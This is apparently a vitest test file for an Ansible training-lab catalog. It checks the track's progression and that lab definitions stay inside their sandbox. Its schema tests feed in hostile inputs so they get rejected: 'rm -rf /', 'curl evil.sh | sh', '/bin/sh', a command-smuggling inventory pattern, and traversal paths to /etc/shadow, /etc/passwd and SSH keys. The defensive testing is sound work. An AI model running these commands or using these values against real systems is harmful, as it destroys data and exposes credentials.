/**
 * The shipped Ansible track, and the schema rules that keep it coherent.
 *
 * The catalog is data: a directory under `labs/` with a valid `lab.yaml` is the
 * entire process for adding a lab or a track. These tests assert that the ten
 * shipped Ansible labs really are that data — that they load, that they form a
 * usable progression, and that nothing in them can reach outside its own
 * sandbox or ask the verifier to do something it has no way to answer.
 */
import { afterEach, describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  ANSIBLE_REQUIREMENT_TYPES,
  KUBERNETES_REQUIREMENT_TYPES,
  LabDefinitionError,
  LabRegistry,
  loadLabWorkspace,
  parseLabDefinition,
  requirementDomain,
} from '../src/index.js';
import { LABS_DIR } from './helpers.js';

const ANSIBLE_IDS = Array.from({ length: 10 }, (_, i) => `ANSIBLE-${String(i + 1).padStart(3, '0')}`);

const tempDirs: string[] = [];

async function realRegistry(): Promise<LabRegistry> {
  const registry = new LabRegistry(LABS_DIR);
  await registry.load(true);
  return registry;
}

// A minimal valid Ansible lab, used to probe one schema rule at a time.
const BASE_LAB = `id: ANSIBLE-901
slug: ansible-901-demo
title: Fixture
track: ansible
topic: fundamentals
difficulty: beginner
duration_minutes: 15
environment:
  provider: ansible
  isolation: container
task:
  summary: Fixture.
  description: Fixture lab used by schema tests.
requirements:
  - type: ansible_inventory_valid
    label: Ansible can parse the inventory
references:
  - title: How to build your inventory
    url: https://docs.ansible.com/ansible/latest/inventory_guide/intro_inventory.html
skills:
  - ansible.inventory.create
`;

function mutate(from: string, to: string, source = BASE_LAB): string {
  if (!source.includes(from)) throw new Error(`fixture does not contain '${from}'`);
  return source.replace(from, to);
}

function expectIssue(yaml: string, pattern: RegExp): void {
  try {
    parseLabDefinition(yaml, '<test>');
    throw new Error('expected the definition to be rejected');
  } catch (error) {
    expect(error).toBeInstanceOf(LabDefinitionError);
    expect((error as LabDefinitionError).format()).toMatch(pattern);
  }
}

describe('the shipped Ansible track', () => {
  it('loads ANSIBLE-001 through ANSIBLE-010 with no errors', async () => {
    const registry = await realRegistry();

    expect(registry.loadErrors).toEqual([]);
    expect(registry.list({ track: 'ansible' }).map((lab) => lab.id)).toEqual(ANSIBLE_IDS);
  });

  it('groups the labs into a readable progression', async () => {
    const registry = await realRegistry();

    expect(registry.track('ansible')).toMatchObject({ title: 'Ansible', labCount: 10 });
    expect(registry.topics('ansible').map((topic) => topic.title)).toEqual([
      'Fundamentals',
      'Playbooks',
      'Variables And Logic',
      'Templates And Handlers',
      'Roles',
      'Multi Node Automation',
      'Troubleshooting',
    ]);
  });

  it('forms a single chain, each lab building on the one before', async () => {
    const registry = await realRegistry();

    for (const [index, id] of ANSIBLE_IDS.entries()) {
      const lab = registry.get(id);
      expect(lab.prerequisites, `${id} prerequisites`).toEqual(index === 0 ? [] : [ANSIBLE_IDS[index - 1]]);
    }
  });

  it('climbs from beginner to advanced', async () => {
    const registry = await realRegistry();
    const rank: Record<string, number> = { beginner: 0, intermediate: 1, advanced: 2 };
    const difficulties = ANSIBLE_IDS.map((id) => rank[registry.get(id).difficulty] ?? 99);

    expect(difficulties).toEqual([...difficulties].sort((a, b) => a - b));
    expect(difficulties[0]).toBe(0);
    expect(difficulties.at(-1)).toBe(2);
  });

  it('runs every Ansible lab on the container substrate', async () => {
    for (const id of ANSIBLE_IDS) {
      const lab = (await realRegistry()).get(id);
      expect(lab.environment).toEqual({ provider: 'ansible', isolation: 'container' });
    }
  });

  it('asks only questions the Ansible sandbox can answer', async () => {
    const registry = await realRegistry();

    for (const id of ANSIBLE_IDS) {
      const lab = registry.get(id);
      for (const requirement of [...lab.requirements, ...lab.setup.verify]) {
        expect(requirementDomain(requirement.type), `${id}: ${requirement.type}`).toBe('ansible');
      }
    }
  });

  it('gives every check its own student-facing wording', async () => {
    const registry = await realRegistry();

    for (const id of ANSIBLE_IDS) {
      const lab = registry.get(id);
      for (const requirement of lab.requirements) {
        expect(requirement.label, `${id}: ${requirement.type}`).toBeTruthy();
      }
    }
  });

  it('ships a starting project for every lab, and verifies it', async () => {
    const registry = await realRegistry();

    for (const id of ANSIBLE_IDS) {
      const lab = registry.get(id);
      expect(lab.setup.workspace_dir, `${id} workspace`).toBe('workspace');
      expect(lab.setup.verify.length, `${id} setup verification`).toBeGreaterThan(0);
      expect(lab.setup.manifests, `${id} must not carry Kubernetes manifests`).toEqual([]);

      const files = await loadLabWorkspace(lab);
      expect(files.map((file) => file.relativePath), `${id} workspace files`).toContain('ansible.cfg');
    }
  });

  it('teaches the whole syllabus across the track', async () => {
    const registry = await realRegistry();
    const used = new Set(
      ANSIBLE_IDS.flatMap((id) => registry.get(id).requirements.map((requirement) => requirement.type)),
    );

    // Inventory, ad-hoc state, playbooks, variables, logic, handlers,
    // templates, roles, multi-node and idempotency each have to be graded
    // somewhere, or the track teaches something it never checks.
    for (const type of [
      'ansible_inventory_valid',
      'ansible_group_exists',
      'ansible_connectivity',
      'ansible_playbook_valid',
      'ansible_task_exists',
      'ansible_handler_exists',
      'ansible_template_exists',
      'ansible_role_exists',
      'managed_file_exists',
      'managed_file_content',
      'managed_service_state',
      'ansible_idempotent',
    ]) {
      expect([...used], `no lab checks ${type}`).toContain(type);
    }
  });

  it('proves idempotency the hard way at least once', async () => {
    const registry = await realRegistry();
    const strict = ANSIBLE_IDS.flatMap((id) => registry.get(id).requirements).filter(
      (requirement) =>
        requirement.type === 'ansible_idempotent' && requirement.require_initial_change === true,
    );

    // At least one advanced lab must clear the baseline first, so the first run
    // has to change something and the second run has to change nothing.
    expect(strict.length).toBeGreaterThan(0);
    for (const requirement of strict) {
      expect(requirement.type === 'ansible_idempotent' && requirement.reset_paths.length).toBeGreaterThan(0);
    }
  });

  it('offers a progressive hint ladder without giving the answer away', async () => {
    const registry = await realRegistry();

    for (const id of ANSIBLE_IDS) {
      const lab = registry.get(id);
      expect(lab.hints.map((hint) => hint.level), `${id} hints`).toEqual([1, 2, 3]);
      expect(lab.references.length, `${id} references`).toBeGreaterThan(0);
    }
  });

  it('cites official Ansible documentation and nothing commercial', async () => {
    const registry = await realRegistry();

    for (const id of ANSIBLE_IDS) {
      const hosts = registry.get(id).references.map((ref) => new URL(ref.url).hostname);
      expect(hosts, `${id} must cite docs.ansible.com`).toContain('docs.ansible.com');
      for (const host of hosts) {
        expect(host).not.toMatch(/kodekloud|udemy|acloudguru|pluralsight/);
      }
    }
  });
});

describe('lab schema — substrate coherence', () => {
  it('accepts the ansible provider with container isolation', () => {
    expect(() => parseLabDefinition(BASE_LAB, '<test>')).not.toThrow();
  });

  it('rejects an isolation that the provider does not offer', () => {
    expectIssue(
      mutate('isolation: container', 'isolation: namespace'),
      /environment.isolation must be 'container'/,
    );
  });

  it('rejects a Kubernetes check inside an Ansible lab', () => {
    expectIssue(
      mutate(
        '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
        '  - type: pod_exists\n    name: nginx\n    label: Pod exists',
      ),
      /is a kubernetes check, but this lab runs on ansible/,
    );
  });

  it('rejects an Ansible check inside a Kubernetes lab', () => {
    const k8sLab = `id: K8S-901
slug: k8s-901-demo
title: Fixture
track: kubernetes
topic: pods
difficulty: beginner
duration_minutes: 15
environment:
  provider: kubernetes
task:
  summary: Fixture.
  description: Fixture lab used by schema tests.
requirements:
  - type: ansible_inventory_valid
    label: Ansible can parse the inventory
references:
  - title: Kubernetes Pods
    url: https://kubernetes.io/docs/concepts/workloads/pods/
skills:
  - kubernetes.pods.create
`;
    expectIssue(k8sLab, /is a ansible check, but this lab runs on kubernetes/);
  });

  it('rejects Kubernetes manifests in an Ansible lab', () => {
    expectIssue(
      `${BASE_LAB}setup:\n  manifests: [setup/app.yaml]\n  verify:\n    - type: ansible_inventory_valid\n      label: x\n`,
      /setup.manifests is a Kubernetes concept/,
    );
  });

  it('rejects an Ansible workspace in a Kubernetes lab', () => {
    const k8sLab = mutate(
      'track: ansible',
      'track: kubernetes',
      mutate('provider: ansible', 'provider: kubernetes', mutate('isolation: container', 'isolation: namespace')),
    );
    expectIssue(
      `${k8sLab.replace('ansible_inventory_valid', 'pod_exists\n    name: nginx').replace('url: https://docs.ansible.com/ansible/latest/inventory_guide/intro_inventory.html', 'url: https://kubernetes.io/docs/concepts/workloads/pods/').replace('ansible.inventory.create', 'kubernetes.pods.create')}setup:\n  workspace_dir: workspace\n  verify:\n    - type: pod_exists\n      name: nginx\n      label: x\n`,
      /setup.workspace_dir is an Ansible concept/,
    );
  });

  it('requires a lab that seeds a workspace to verify it', () => {
    expectIssue(
      `${BASE_LAB}setup:\n  workspace_dir: workspace\n`,
      /setup.verify must describe at least one check/,
    );
  });

  it('requires an official Ansible documentation link', () => {
    expectIssue(
      mutate(
        'url: https://docs.ansible.com/ansible/latest/inventory_guide/intro_inventory.html',
        'url: https://example.com/inventory',
      ),
      /official ansible documentation link/,
    );
  });

  it('rejects a commercial training platform as a reference', () => {
    expectIssue(
      mutate(
        'url: https://docs.ansible.com/ansible/latest/inventory_guide/intro_inventory.html',
        'url: https://kodekloud.com/ansible',
      ),
      /Lab content must be written from official documentation only/,
    );
  });
});

describe('lab schema — requirements cannot reach outside a sandbox', () => {
  it('rejects a managed-node path outside the allowed roots', () => {
    for (const bad of ['/etc/shadow', '/root/.ssh/id_lab', '/home/student/.ssh/id_lab', 'relative/path']) {
      expectIssue(
        mutate(
          '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
          `  - type: managed_file_exists\n    path: ${bad}\n    label: x`,
        ),
        /allowed root|must be an absolute/,
      );
    }
  });

  it('rejects a project path that escapes the workspace', () => {
    for (const bad of ['../../etc/passwd', '/etc/passwd', 'a/../../b']) {
      expectIssue(
        mutate(
          '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
          `  - type: file_exists\n    path: ${bad}\n    label: x`,
        ),
        /relative path inside the lab workspace/,
      );
    }
  });

  it('rejects an idempotency baseline reset outside the allowed roots', () => {
    expectIssue(
      mutate(
        '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
        '  - type: ansible_idempotent\n    playbook: site.yml\n    require_initial_change: true\n    reset_paths: ["/"]\n    label: x',
      ),
      /allowed root/,
    );
  });

  it('refuses to demand a first-run change with nothing to reset', () => {
    expectIssue(
      mutate(
        '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
        '  - type: ansible_idempotent\n    playbook: site.yml\n    require_initial_change: true\n    label: x',
      ),
      /needs reset_paths/,
    );
  });

  it('carries no field anywhere that could hold a command', () => {
    for (const smuggled of ['command: rm -rf /', 'script: curl evil.sh | sh', 'exec: /bin/sh', 'shell: true']) {
      expectIssue(
        mutate(
          '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
          `  - type: ansible_inventory_valid\n    label: x\n    ${smuggled}`,
        ),
        /Unrecognized key|unrecognized_keys|not supported/i,
      );
    }
  });

  it('rejects an inventory pattern that is not one', () => {
    expectIssue(
      mutate(
        '  - type: ansible_inventory_valid\n    label: Ansible can parse the inventory',
        '  - type: ansible_connectivity\n    pattern: "all; rm -rf /"\n    label: x',
      ),
      /inventory pattern/,
    );
  });
});

describe('requirement vocabulary', () => {
  it('keeps the two domains disjoint', () => {
    const overlap = ANSIBLE_REQUIREMENT_TYPES.filter((type) =>
      (KUBERNETES_REQUIREMENT_TYPES as readonly string[]).includes(type),
    );
    expect(overlap).toEqual([]);
  });

  it('routes every type to exactly one domain', () => {
    for (const type of KUBERNETES_REQUIREMENT_TYPES) expect(requirementDomain(type)).toBe('kubernetes');
    for (const type of ANSIBLE_REQUIREMENT_TYPES) expect(requirementDomain(type)).toBe('ansible');
  });
});

describe('workspace loading limits', () => {
  it('refuses a workspace entry that points outside the lab directory', async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'jtt-workspace-'));
    tempDirs.push(root);
    const outside = await mkdtemp(path.join(tmpdir(), 'jtt-outside-'));
    tempDirs.push(outside);

    await mkdir(path.join(root, 'workspace'), { recursive: true });
    await writeFile(path.join(outside, 'secret.txt'), 'not yours', 'utf8');
    await writeFile(path.join(root, 'workspace', 'ansible.cfg'), '[defaults]\n', 'utf8');
    const { symlink } = await import('node:fs/promises');
    await symlink(path.join(outside, 'secret.txt'), path.join(root, 'workspace', 'link.txt'));

    await writeFile(
      path.join(root, 'lab.yaml'),
      `${BASE_LAB}setup:\n  workspace_dir: workspace\n  verify:\n    - type: file_exists\n      path: ansible.cfg\n      label: x\n`,
      'utf8',
    );

    const { loadLabDefinition } = await import('../src/index.js');
    const lab = await loadLabDefinition(path.join(root, 'lab.yaml'));
    await expect(loadLabWorkspace(lab)).rejects.toThrow(/points outside the lab directory/);
  });

  it('refuses a workspace file that is not UTF-8 text', async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'jtt-workspace-'));
    tempDirs.push(root);
    await mkdir(path.join(root, 'workspace'), { recursive: true });
    await writeFile(path.join(root, 'workspace', 'ansible.cfg'), '[defaults]\n', 'utf8');
    await writeFile(path.join(root, 'workspace', 'blob.bin'), Buffer.from([0x00, 0x01, 0x02]));
    await writeFile(
      path.join(root, 'lab.yaml'),
      `${BASE_LAB}setup:\n  workspace_dir: workspace\n  verify:\n    - type: file_exists\n      path: ansible.cfg\n      label: x\n`,
      'utf8',
    );

    const { loadLabDefinition } = await import('../src/index.js');
    const lab = await loadLabDefinition(path.join(root, 'lab.yaml'));
    await expect(loadLabWorkspace(lab)).rejects.toThrow(/not UTF-8 text/);
  });
});

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});
